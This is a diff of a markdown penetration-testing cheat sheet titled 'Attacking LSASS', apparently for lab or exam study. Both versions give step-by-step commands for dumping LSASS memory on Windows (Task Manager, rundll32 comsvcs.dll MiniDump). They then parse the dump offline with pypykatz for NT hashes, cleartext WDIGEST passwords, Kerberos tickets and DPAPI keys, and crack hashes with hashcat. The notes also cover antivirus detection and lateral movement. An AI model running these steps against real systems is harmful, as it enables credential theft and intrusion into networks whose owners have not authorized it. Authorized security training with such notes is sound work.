@@ -1,77 +1,41 @@
-## LSASS Process Identification
+# Attacking LSASS
 
-Targeting LSASS is necessary to extract sensitive credential material stored in memory by the Local Security Authority Subsystem Service. Identifying the **PID** is required before using CLI-based dumping utilities.
+## Dump
 
-Find PID using standard command prompt
+GUI session — Task Manager → Processes → right-click `lsass.exe` → Create dump file → `%temp%\lsass.DMP`
 
+No GUI — get PID first, then rundll32 (flagged by most AV):
+
+```cmd
+tasklist /svc | findstr lsass
 ```
-tasklist /svc
-```
 
-Find PID using PowerShell
-
-```
+```powershell
 Get-Process lsass
 ```
 
-- **Tool comparison**
-    - tasklist → `tasklist /svc` → Prefer in restricted cmd shells
-    - Get-Process → `Get-Process lsass` → Prefer in PowerShell sessions for cleaner object output
-
-## LSASS GUI Memory Dump
-
-Use when an **interactive graphical session** is available on the target. This allows for a native dump without executing command-line arguments that may be logged.
-
-1. Open Task Manager.
-2. Locate `lsass.exe`.
-3. Right-click and select **Create dump file**.
-
-- **Gotchas**
-    - **Interactive session requirement** means this cannot be performed over a standard shell.
-
-## LSASS CLI Memory Dump
-
-Use when only command-line access is available or a faster dump is required. Requires an **elevated PowerShell session** for execution.
-
-Dumping via native Windows utility and comsvcs.dll
-
-```
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <FILE_PATH> full
+```powershell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
-- **Gotchas**
-    - **AV detection** is highly likely as modern antivirus recognizes the comsvcs.dll MiniDump call as malicious.
+Transfer the .dmp to attack host, same SMB method as SAM.
 
-## Offline Credential Extraction
+## Parse
 
-Use once a `.dmp` file is transferred to a Linux-based attack host to parse secrets offline and avoid running Mimikatz on the target.
+Parse offline on Linux with pypykatz:
 
-Parse LSASS minidump for hashes and clear-text secrets
-
-```
-pypykatz lsa minidump <FILE_PATH>
+```bash
+pypykatz lsa minidump <DUMPFILE>.dmp
 ```
 
-- **Tool comparison**
-    
-    - pypykatz → `pypykatz lsa minidump <FILE_PATH>` → Prefer for offline analysis on Linux hosts
-    - Mimikatz → Internal commands → Only use if Windows-based attack host is available or on-target execution is safe
-- **Dangerous / misconfigured settings**
-    
-    - **WDIGEST enabled**: Older Windows versions or misconfigured modern systems will store credentials in **clear-text** within LSASS.
-- **Gotchas**
-    
-    - **Active logon sessions** must exist at the time of the dump, or no sensitive material will be present in the snapshot.
+What to pull from output: `== MSV ==` → NT hash (PTH or crack mode 1000). `== WDIGEST ==` → cleartext if target is pre-Win8/Server 2012 or WDIGEST re-enabled. `== Kerberos ==` → tickets/ekeys for domain lateral movement. `== DPAPI ==` → masterkeys for Chrome/Outlook/RDP cred decryption.
 
-## NT Hash Cracking
+Crack NT hash:
 
-Use when **MSV** authentication package data has been extracted from the LSASS dump and provides NT hashes.
-
-Crack extracted NT hash using a wordlist
-
-```
-hashcat -m 1000 <HASH> <FILE_PATH>
+```bash
+hashcat -m 1000 <NT_HASH> <WORDLIST>
 ```
 
-- **Edge cases**
-    - **Kerberos tickets**: If hashes are uncrackable, look for Kerberos ekeys or tickets in the pypykatz output for Pass-the-Ticket attacks.
+> [!warning] `rundll32 + comsvcs.dll MiniDump` is flagged by modern AV as malicious — will be blocked on hardened hosts. Task Manager method is quieter but needs GUI.
+
+> [!tip] WDIGEST `password: None` = disabled (modern Windows default). If you see an actual password string there, it's cleartext — take it immediately.
